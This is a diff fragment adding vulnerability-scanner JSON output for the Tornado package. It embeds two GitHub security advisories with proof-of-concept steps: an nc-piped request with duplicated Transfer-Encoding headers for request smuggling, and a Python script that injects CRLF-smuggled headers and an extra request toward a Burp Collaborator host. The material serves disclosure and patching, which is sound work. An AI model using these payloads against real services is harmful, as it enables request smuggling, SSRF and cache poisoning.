+              "related": [
+                "CGA-2mj6-w546-q9r6",
+                "CGA-72gj-8qx6-gcj4",
+                "CGA-gfgp-4jrg-x8xh",
+                "CGA-wq3q-35vc-xj9h"
+              ],
+              "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
+              "details": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat \u003c\u003c EOF \u003e server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py \u0026\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "tornado",
+                    "purl": "pkg:pypi/tornado"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.4.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.2",
+                    "1.0",
+                    "1.1",
+                    "1.1.1",
+                    "1.2",
+                    "1.2.1",
+                    "2.0",
+                    "2.1",
+                    "2.1.1",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.4",
+                    "2.4.1",
+                    "3.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.1",
+                    "3.1.1",
+                    "3.2",
+                    "3.2.1",
+                    "3.2.2",
+                    "4.0",
+                    "4.0.1",
+                    "4.0.2",
+                    "4.1",
+                    "4.1b2",
+                    "4.2",
+                    "4.2.1",
+                    "4.2b1",
+                    "4.3",
+                    "4.3b1",
+                    "4.3b2",
+                    "4.4",
+                    "4.4.1",
+                    "4.4.2",
+                    "4.4.3",
+                    "4.4b1",
+                    "4.5",
+                    "4.5.1",
+                    "4.5.2",
+                    "4.5.3",
+                    "4.5b1",
+                    "4.5b2",
+                    "5.0",
+                    "5.0.1",
+                    "5.0.2",
+                    "5.0a1",
+                    "5.0b1",
+                    "5.1",
+                    "5.1.1",
+                    "5.1b1",
+                    "6.0",
+                    "6.0.1",
+                    "6.0.2",
+                    "6.0.3",
+                    "6.0.4",
+                    "6.0a1",
+                    "6.0b1",
+                    "6.1",
+                    "6.1b1",
+                    "6.1b2",
+                    "6.2",
+                    "6.2b1",
+                    "6.2b2",
+                    "6.3",
+                    "6.3.1",
+                    "6.3.2",
+                    "6.3.3",
+                    "6.3b1",
+                    "6.4",
+                    "6.4b1"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.4.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-753j-mpmx-qq6g/GHSA-753j-mpmx-qq6g.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/tornadoweb/tornado"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-444"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-06T21:41:20Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            },
+            {
+              "modified": "2024-06-06T22:04:10Z",
+              "published": "2024-06-06T21:46:31Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-w235-7p84-xx57",
+              "related": [
+                "CGA-3mg6-hjmp-vwjr",
+                "CGA-cj87-mmpg-46c2",
+                "CGA-fgf6-jq66-8gmr",
+                "CGA-jf2f-4wch-4c93"
+              ],
+              "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
+              "details": "### Summary\nTornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n\u003e The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "tornado",
+                    "purl": "pkg:pypi/tornado"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.4.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.2",
+                    "1.0",
+                    "1.1",
+                    "1.1.1",
+                    "1.2",
+                    "1.2.1",
+                    "2.0",
+                    "2.1",
+                    "2.1.1",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.4",
+                    "2.4.1",
+                    "3.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.1",
+                    "3.1.1",
+                    "3.2",
+                    "3.2.1",
+                    "3.2.2",
+                    "4.0",
+                    "4.0.1",
+                    "4.0.2",
+                    "4.1",
+                    "4.1b2",
+                    "4.2",
+                    "4.2.1",
+                    "4.2b1",
+                    "4.3",
+                    "4.3b1",
+                    "4.3b2",
+                    "4.4",
+                    "4.4.1",
+                    "4.4.2",
+                    "4.4.3",
+                    "4.4b1",
+                    "4.5",
+                    "4.5.1",
+                    "4.5.2",
+                    "4.5.3",
+                    "4.5b1",
+                    "4.5b2",
+                    "5.0",
+                    "5.0.1",
+                    "5.0.2",
+                    "5.0a1",
+                    "5.0b1",
+                    "5.1",
+                    "5.1.1",
+                    "5.1b1",
+                    "6.0",
+                    "6.0.1",
+                    "6.0.2",
+                    "6.0.3",
+                    "6.0.4",
+                    "6.0a1",
+                    "6.0b1",
+                    "6.1",
+                    "6.1b1",
+                    "6.1b2",
+                    "6.2",
+                    "6.2b1",
+                    "6.2b2",
+                    "6.3",
+                    "6.3.1",
+                    "6.3.2",
+                    "6.3.3",
+                    "6.3b1",
+                    "6.4",
+                    "6.4b1"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.4.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-w235-7p84-xx57/GHSA-w235-7p84-xx57.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/tornadoweb/tornado"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-93"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-06T21:46:31Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-753j-mpmx-qq6g"
+              ],
+              "aliases": [
+                "GHSA-753j-mpmx-qq6g"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-w235-7p84-xx57"
+              ],
+              "aliases": [
+                "GHSA-w235-7p84-xx57"
+              ],
+              "max_severity": "6.5"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
